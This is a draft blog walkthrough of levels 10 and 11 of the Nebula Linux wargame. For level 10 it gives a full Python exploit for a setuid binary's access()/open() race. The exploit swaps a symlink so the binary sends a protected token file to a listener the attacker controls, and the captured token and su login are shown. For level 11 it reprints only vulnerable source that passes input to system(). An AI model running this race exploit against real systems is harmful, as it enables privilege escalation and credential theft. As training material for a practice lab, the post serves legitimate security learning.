Title: Nebula Wargame walkthrough Level 10-19
Date: 2015-09-29 10:30
Modified: 2015-09-29 10:30
Author: Nikolai Tschacher
Summary: Walkthrough of nebula wargame from level 10 to level 19
Category: Wargames
Tags: Linux, Programming, Security, Problem Solving
Slug: nebula-wargame-walkthrough-level-10-19
Status: draft


## Preface

In the last [blog post]({filename}/Wargames/nebula-wargame-walkthrough.md) I covered the Nebula Wargame levels from 0 to 9. Now I will
try to solve the levels 10 to 19. In this blog post you'll see the most importanct concepts in understanding my attempts in
problem solving.


## Level 10 - Race conditions in network applications

This level wasy quite hard compared to other levels before!

There are two files in the `/home/flag10` directory:

+ The `/home/flag10/flag10` setuid binary 
+ A token file which we want to read

The setuid binary was compiled from the following code:


	:::c
	#include <stdlib.h>
	#include <unistd.h>
	#include <sys/types.h>
	#include <stdio.h>
	#include <fcntl.h>
	#include <errno.h>
	#include <sys/socket.h>
	#include <netinet/in.h>
	#include <string.h>

	int main(int argc, char **argv)
	{
	  char *file;
	  char *host;

	  if(argc < 3) {
	    printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
	    exit(1);
	  }

	  file = argv[1];
	  host = argv[2];

	  if(access(argv[1], R_OK) == 0) {
	    int fd;
	    int ffd;
	    int rc;
	    struct sockaddr_in sin;
	    char buffer[4096];

	    printf("Connecting to %s:18211 .. ", host); fflush(stdout);

	    fd = socket(AF_INET, SOCK_STREAM, 0);

	    memset(&sin, 0, sizeof(struct sockaddr_in));
	    sin.sin_family = AF_INET;
	    sin.sin_addr.s_addr = inet_addr(host);
	    sin.sin_port = htons(18211);

	    if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
	      printf("Unable to connect to host %s\n", host);
	      exit(EXIT_FAILURE);
	    }

	#define HITHERE ".oO Oo.\n"
	    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
	      printf("Unable to write banner to host %s\n", host);
	      exit(EXIT_FAILURE);
	    }
	#undef HITHERE

	    printf("Connected!\nSending file .. "); fflush(stdout);

	    ffd = open(file, O_RDONLY);
	    if(ffd == -1) {
	      printf("Damn. Unable to open file\n");
	      exit(EXIT_FAILURE);
	    }

	    rc = read(ffd, buffer, sizeof(buffer));
	    if(rc == -1) {
	      printf("Unable to read from file: %s\n", strerror(errno));
	      exit(EXIT_FAILURE);
	    }

	    write(fd, buffer, rc);

	    printf("wrote file!\n");

	  } else {
	    printf("You don't have access to %s\n", file);
	  }
	}
	}


Only after reading the notes in `man access` it became clear to me how to attack this application. In the manual notes, there is written:


> Warning: Using `access()` to check if a user is authorized to, for example, open a file before actually doing so using `open(2)` creates a security hole, because the
   user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason, the  use  of  this  system  call  should  be
   avoided.   (In  the  example  just  described,  a  safer  alternative would be to temporarily switch the process's effective user ID to the real ID and then call
   `open(2)`.)

So we are going to exploit the fact that we can change the target of a symbolic (or static) link between the `access()` and `open()` system call! The fact that
the `connect()` system call is between the both makes it even more simple, because usually, `connect()` needs some time to finish.

My exploit is written in Python. I guess you could create a much simpler version in some lines of shell code (like using netcat). But sometimes it's also important
to write your own socket programs to gain experience.

	:::python
	#!/usr/bin/python

	import os
	import socket
	import threading
	import subprocess
	import time
	import sys
	import signal

	ip = '192.168.56.101'

	def run_server():
		pid = os.getpid()
		try:
			address = (ip, 18211)
			print('[i] About to run server on {}'.format(address))
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.bind(address)
			s.listen(5)
			
			while True:
				conn, address = s.accept()
				t = threading.Thread(target=handle_connection, args=(conn, address, pid))
				t.start()

		except KeyboardInterrupt:
			if s:
				s.close()
			sys.exit('Pressed Ctrl-C. Exiting...')

	def handle_connection(conn, address, serverpid):
		print('Incoming connection from {}'.format(address))
		# wait a second before receiving data
		time.sleep(1)
		banner = conn.recv(1024)	
		print(banner)

		token_contents = conn.recv(1024)
		print(token_contents)

		if token_contents.strip():
			os.kill(serverpid, signal.SIGKILL)
		
		
	def race_condition():
		"""
		First create a symbolic link to a file which we own
		to bypass the access() check, then change the link to
		the /home/flag10/token after access() was executed.
		"""
		os.chdir('/home/level10/')
		
		# create a file that user level10 owns
		os.system('echo "bla " >> /tmp/testfile')

		# create a link to the previously created file 
		os.system('ln -s -f /tmp/testfile /home/level10/link')

		# call the setuid binary in a non blocking fashion
		subprocess.Popen(['/home/flag10/flag10 /home/level10/link ' + ip], shell=True, 
					stdin=None, stdout=None, stderr=None, close_fds=True)

		# lets hope that access was alraedy executed but read() wasnt't
		# because the connection is still awaiting to get accepted.
		# then change the link location to the token file :)
		os.system('ln -s -f /home/flag10/token /home/level10/link')

		
	def main():
		server = threading.Thread(target=run_server)
		server.start()

		race_condition()

	if __name__ == '__main__':
		main()


When calling the above program, it sometimes works, and sometimes it doesn't. It's probably because the `connect()` call
takes different amount of times. On a successful execution we get:

	:::bash
	level10@nebula:~$ python exploit.py 
	[i] About to run server on ('192.168.56.101', 18211)
	Connecting to 192.168.56.101:18211 .. Connected!
	Sending file .. wrote file!
	Incoming connection from ('192.168.56.101', 41962)
	.oO Oo.
	615a2ce1-b2b5-4c76-8eed-8aa5c4015c27


	^Z
	[1]+  Stopped(SIGTSTP)        python exploit.py

Testing the password:

	:::bash
	level10@nebula:~$ su flag10
	Password: 
	sh-4.2$ getflag
	You have successfully executed getflag on a target account
	sh-4.2$ 

## Level 11

The source code for the setuid binary in this level looks like the following:

	:::c
	include <stdlib.h>
	include <unistd.h>
	include <string.h>
	include <sys/types.h>
	include <fcntl.h>
	include <stdio.h>
	include <sys/mman.h>

	/*
	 * Return a random, non predictable file, and return the file descriptor for it.
	 */

	int getrand(char **path)
	{
	  char *tmp;
	  int pid;
	  int fd;

	  srandom(time(NULL));

	  tmp = getenv("TEMP");
	  pid = getpid();
	  
	  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 
	    'A' + (random() % 26), '0' + (random() % 10), 
	    'a' + (random() % 26), 'A' + (random() % 26),
	    '0' + (random() % 10), 'a' + (random() % 26));

	  fd = open(*path, O_CREAT|O_RDWR, 0600);
	  unlink(*path);
	  return fd;
	}

	void process(char *buffer, int length)
	{
	  unsigned int key;
	  int i;

	  key = length & 0xff;

	  for(i = 0; i < length; i++) {
	    buffer[i] ^= key;
	    key -= buffer[i];
	  }

	  system(buffer);
	}

	#define CL "Content-Length: "

	int main(int argc, char **argv)
	{
	  char line[256];
	  char buf[1024];
	  char *mem;
	  int length;
	  int fd;
	  char *path;

	  if(fgets(line, sizeof(line), stdin) == NULL) {
	    errx(1, "reading from stdin");
	  }

	  if(strncmp(line, CL, strlen(CL)) != 0) {
	    errx(1, "invalid header");
	  }

	  length = atoi(line + strlen(CL));
	  
	  if(length < sizeof(buf)) {
	    if(fread(buf, length, 1, stdin) != length) {
	      err(1, "fread length");
	    }
	    process(buf, length);
	  } else {
	    int blue = length;
	    int pink;

	    fd = getrand(&path);

	    while(blue > 0) {
	      printf("blue = %d, length = %d, ", blue, length);

	      pink = fread(buf, 1, sizeof(buf), stdin);
	      printf("pink = %d\n", pink);

	      if(pink <= 0) {
	        err(1, "fread fail(blue = %d, length = %d)", blue, length);
	      }
	      write(fd, buf, pink);

	      blue -= pink;
	    }  

	    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	    if(mem == MAP_FAILED) {
	      err(1, "mmap");
	    }
	    process(mem, length);
	   }

	}

